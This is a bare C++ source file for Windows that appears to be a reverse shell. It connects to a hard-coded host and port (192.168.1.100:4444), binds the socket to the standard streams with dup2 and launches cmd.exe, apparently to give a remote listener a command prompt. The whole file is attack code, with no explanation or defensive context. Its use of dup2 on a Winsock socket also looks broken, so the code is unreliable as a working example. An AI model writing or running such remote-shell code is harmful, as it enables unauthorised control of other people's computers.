#include <iostream>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "192.168.1.100"
#define SERVER_PORT 4444

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2,2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(SERVER_PORT);

    connect(sock, (struct sockaddr*)&server, sizeof(server));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    system("cmd.exe");

    return 0;
}